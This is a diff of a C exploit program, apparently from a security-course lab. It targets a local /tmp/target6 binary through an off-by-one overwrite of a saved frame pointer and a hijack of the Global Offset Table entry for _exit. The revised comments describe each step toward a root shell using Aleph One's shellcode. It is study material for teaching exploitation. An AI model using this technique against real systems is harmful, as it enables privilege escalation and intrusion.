@@ -7,7 +7,21 @@
 #define TARGET "/tmp/target6"
 #define EGG_SIZE 208
 
-
+/* 
+ * Main idea of exploit:
+ *     This is a GOT exploit. 
+ *
+ *     In this exploit we have a buffer big enough 
+ *     to hold our shellcode and we can only overwrite
+ *     the LSB of the saved ebp in the bar stack frame. 
+ *     The main idea is to change this byte so that the 
+ *     saved ebp now points to an address inside our buffer. 
+ *     The prologue for bar will restore the ebp to this 
+ *     fake ebp. After control returns to foo the the next
+ *     instructions will overwrite the address for _exit
+ *     _exit in the Global Offset Table (GOT) with the address
+ *     of our shellcode. Upon calling exit we get root shell. 
+ */
 
 int main(void)
 {
@@ -20,37 +34,24 @@ int main(void)
   buffAddr = 0xBFFFFC80; /* start address of buf in target6.c:bar */
   gotAddr = 0x8049774; /* GOT address for _exit */
 
-  /* First, fill the exploit string with the start address of the buf
-     in bar. We will set it up such that at some point immediately 
-     before a 'ret' instruction our stack pointer will point inside 
-     buf and hence the 'ret' instruction will pop off and insert 
-     0xBFFFFC90 (the start address of buf) into eip. At that point 
-     the shellcode will begin executing and we are done. */
+  /* Fill egg with the address of the buffer in target6.c:bar, where shellcode resides */
   addrPtr = (long *) egg; 
   for (i = 0; i < EGG_SIZE; i += 4)
      *(addrPtr++) = buffAddr;
   
-  /* The check 'i <= len' inside the for loop in nstrcpy allows us
-     to overwrite the LSB of the saved ebp for the foo stack frame,
-     which is 0xBFFFFD68. This differs only in the LSB with 0xBFFFFD40
-     which is an address inside buf. If we overwrite the LSB of the 
-     saved ebp for the foo stack frame to 0x40 then the 'leave' 
-     instruction for the bar function call will restore ebp to 
-     0xBFFFFD40. Next, the 'leave' instruction for the foo function 
-     call will set esp to 0xBFFFFD40, pop off 4 bytes to restore a junk
-     ebp and leave esp equal to 0xBFFFFD40. Since the address 
-     0xBFFFFD40 is inside buf, it contains the value 0xBFFFFC80 (the 
-     start of the buffer) and hence the 'ret' call immediately after 
-     will set eip equal to 0xBFFFFC80. 
-
-     Notice EGG_SIZE - 8 is the 201 byte of the exploit string. This
-     is exactly the byte that will overwrite the LSB of the saved ebp
-     for foo stack frame. */
-  egg[EGG_SIZE - 8] = 0x48;
-
-  /* write GOT addr */
+  /* write GOT addr for _exit */
   addrPtr = (long *)&egg[EGG_SIZE - 12];
   *addrPtr = gotAddr; 
+
+  /* Last byte that will overwrite bar's saved ebp. 
+     Point it inside the buffer, so that when control 
+     returns to foo the instructions:
+        mov    -0x8(%ebp),%edx
+        mov    -0x4(%ebp),%eax
+        mov    %edx,(%eax)
+     will overwrite the GOT entry for _exit with the
+     shellcode address. */ 
+  egg[EGG_SIZE - 8] = 0x48;
 
   /* Then fill the first bytes of the exploit string with
      Aleph One's shellcode */
